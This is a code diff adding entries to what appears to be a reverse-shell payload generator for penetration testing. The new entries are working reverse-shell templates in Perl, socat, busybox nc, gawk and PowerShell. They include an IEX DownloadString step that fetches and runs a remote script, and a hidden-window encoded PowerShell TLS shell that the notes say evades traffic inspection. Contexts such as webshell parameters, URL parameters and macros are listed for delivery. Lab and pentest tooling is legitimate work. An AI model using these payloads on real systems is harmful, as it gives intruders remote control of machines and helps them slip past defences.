@@ -1,4 +1,4 @@
-import { POWERSHELL_TCP } from "./psScripts";
+import { POWERSHELL_TCP, POWERSHELL_TLS } from "./psScripts";
 import type { ListenerId, PayloadDef } from "./types";
 
 const REVERSE: ListenerId[] = ["penelope", "rlwrap-nc"];
@@ -141,5 +141,94 @@ export const REVERSE_SHELLS: PayloadDef[] = [
     ],
     listeners: REVERSE,
     notes: ["Needs an nc.exe built with -e; if it returns instantly, the build has no -e."],
+  },
+  {
+    id: "perl", generator: "shell", title: "Perl", os: "linux",
+    contexts: [...ALL_LINUX], requires: ["perl"],
+    template: `perl -e 'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
+    parts: [
+      { token: "perl -e", explain: "-e: run the quoted program. Perl is on almost every Linux, including minimal boxes without python." },
+      { token: "socket(S,PF_INET,SOCK_STREAM", explain: "Creates a TCP socket named S." },
+      { token: "connect(S,sockaddr_in(", explain: "Connects it to your LHOST and LPORT; the rest only runs if the connection opens." },
+      { token: "open(STDIN,\">&S\")", explain: "Points stdin, stdout and stderr at the socket (the next two open() calls do stdout and stderr)." },
+      SH_PART,
+      BASH_C_PART,
+    ],
+    listeners: REVERSE,
+  },
+  {
+    id: "socat-tty", generator: "shell", title: "socat with full TTY", os: "linux",
+    contexts: [...ALL_LINUX], requires: ["socat"],
+    template: "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{LHOST}:{LPORT}",
+    parts: [
+      { token: "socat", explain: "Joins two ends: a shell on a PTY, and a TCP connection to you." },
+      { token: "exec:'bash -li'", explain: "-li: a login, interactive bash, started for the connection." },
+      { token: "pty,stderr,setsid,sigint,sane", explain: "A real terminal for it: errors included, its own session, Ctrl-C reaches the shell, sane terminal settings." },
+      { token: "tcp:", explain: "Connects out to your listener." },
+      BASH_C_PART,
+    ],
+    listeners: ["socat-tty", "rlwrap-nc"],
+    notes: ["Needs socat on the target, or a static socat binary transferred and run first."],
+  },
+  {
+    id: "busybox-nc", generator: "shell", title: "busybox nc -e", os: "linux",
+    contexts: [...ALL_LINUX], requires: ["busybox"],
+    template: "busybox nc {LHOST} {LPORT} -e /bin/sh",
+    parts: [
+      { token: "busybox nc", explain: "BusyBox's own netcat, which (unlike the stock nc on most distros) keeps -e." },
+      { token: "-e", explain: "-e: run this program and attach it to the socket." },
+      { token: "/bin/sh", explain: "The program handed to the connection." },
+      BASH_C_PART,
+    ],
+    listeners: REVERSE,
+    notes: ["Common on routers, embedded boxes and minimal containers. Not every BusyBox build compiles nc -e in."],
+  },
+  {
+    id: "awk", generator: "shell", title: "awk (gawk /inet/tcp)", os: "linux",
+    contexts: [...ALL_LINUX], requires: ["awk"],
+    template: `awk 'BEGIN{s="/inet/tcp/0/{LHOST}/{LPORT}";while(1){printf "> " |& s;s |& getline c;if(c){while((c |& getline) > 0)print $0 |& s;close(c)}}}'`,
+    parts: [
+      { token: "awk", explain: "gawk: the only awk with built-in networking." },
+      { token: "/inet/tcp/0/", explain: "gawk's special file for a TCP connection: local port 0 (any), then the remote host and port." },
+      { token: "|&", explain: "Two-way pipe: writes to the socket, or reads the command you typed from it." },
+      { token: "getline", explain: "Reads your command from the socket, then the output of running it." },
+      BASH_C_PART,
+    ],
+    listeners: REVERSE,
+    notes: ["Needs gawk: /inet/tcp is a gawk feature and mawk (the Debian and Ubuntu default awk) has none. Not a PTY: no su or sudo prompts."],
+  },
+  {
+    id: "conptyshell", generator: "shell", title: "ConPtyShell (full Windows TTY)", os: "windows",
+    contexts: ["powershell"], requires: ["powershell", "served-file"],
+    template: "IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}{WEB_PORT}/Invoke-ConPtyShell.ps1');Invoke-ConPtyShell -RemoteIp {LHOST} -RemotePort {LPORT} -Rows {ROWS} -Cols {COLS}",
+    defaults: { ROWS: "40", COLS: "160" },
+    parts: [
+      { token: "curl -sO https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1", explain: "On Kali: downloads the script into the folder you serve." },
+      SERVE_PART,
+      { token: "IEX(", explain: "Runs the downloaded text as code, so nothing is written to disk." },
+      { token: "DownloadString('http://", explain: "Fetches Invoke-ConPtyShell.ps1 from your web server." },
+      { token: "-RemoteIp", explain: "-RemoteIp: your listener's address." },
+      { token: "-RemotePort", explain: "-RemotePort: your listener's port." },
+      { token: "-Rows", explain: "-Rows: terminal height. Match it to your own terminal (stty size)." },
+      { token: "-Cols", explain: "-Cols: terminal width. Match it to your own terminal (stty size)." },
+    ],
+    listeners: ["socat-tty"], prepare: "curl -sO https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1", serve: SERVE,
+    notes: ["Run from a PowerShell prompt. Windows 10 1809 / Server 2019 or newer (needs the ConPTY API).",
+      "Alternative listener: stty raw -echo; (stty size; cat) | nc -lvnp {LPORT}, so the terminal size comes across.",
+      "The prepare step needs internet on Kali: keep a copy of the script for offline labs."],
+  },
+  {
+    id: "ps-tls", generator: "shell", title: "PowerShell TLS (-e)", os: "windows",
+    contexts: ["cmd", "powershell", "webshell-param", "url-param", "macro"],
+    requires: ["powershell"], template: POWERSHELL_TLS, encodePowerShell: true,
+    parts: [
+      { token: "powershell", explain: "Starts PowerShell. One token, so no quoting breaks in cmd or a URL." },
+      { token: "-nop", explain: "-nop: no profile, so nothing slows or alters the start." },
+      { token: "-w hidden", explain: "-w hidden: no visible window on the target." },
+      { token: "-e", explain: "-e (same as -enc, -EncodedCommand): the argument is base64 of UTF-16LE text. Inside it, SslStream wraps the connection in TLS and accepts any certificate." },
+    ],
+    listeners: ["ncat-ssl"],
+    notes: ["Pairs with ncat --ssl (it makes a throwaway certificate) or openssl s_server -quiet -key key.pem -cert cert.pem -port <your LPORT>.",
+      "The traffic is encrypted, so it passes inspection that would flag a plain-text shell."],
   },
 ];
